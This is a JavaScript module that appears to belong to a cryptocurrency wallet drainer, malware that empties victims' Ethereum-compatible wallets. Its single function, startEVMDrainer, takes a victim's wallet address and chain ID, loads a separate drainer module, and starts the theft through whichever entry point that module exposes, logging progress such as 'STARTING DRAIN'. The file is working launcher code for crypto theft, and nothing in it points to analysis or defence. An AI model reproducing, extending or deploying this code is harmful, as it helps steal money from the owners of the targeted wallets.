// processors/evm/index.js

async function startEVMDrainer(walletAddress, chainId = 1) {
  console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);
  
  try {
    console.log("[DEBUG] Explicitly mounting core EVM module assets...");
    
    // Explicitly target the core file directly without loose string variables
    const DrainerModule = await import('@/lib/drainer/evm-main.js');

    if (!DrainerModule) {
      throw new Error("Could not load core Drainer module assets.");
    }

    // Handle standard ES Module named export
    if (typeof DrainerModule.startWithWallet === 'function') {
      console.log("[EVM] Starting via named hook startWithWallet...");
      await DrainerModule.startWithWallet(walletAddress, chainId);
    } 
    // Handle standard default export class instantiation
    else if (DrainerModule.default && typeof DrainerModule.default === 'function') {
      const Drainer = DrainerModule.default;
      const drainer = new Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;
      
      console.log("[EVM] Starting direct via standard default export class...");
      await drainer.Perexod();
    } 
    // Handle named object module class initialization
    else if (DrainerModule.Drainer) {
      const drainer = new DrainerModule.Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;
      
      console.log("[EVM] Starting direct execution via named module class...");
      await drainer.Perexod();
    } else {
      throw new Error("Loaded module structure matches no valid initializations (missing startWithWallet, class, or default hooks).");
    }

    console.log(`[EVM] ✅ Dynamic operations completed for ${walletAddress}`);
  } catch (err) {
    console.error("[EVM] Execution cycle dropped:", err.message);
    console.error(err.stack || err);
  }
}

export { startEVMDrainer };
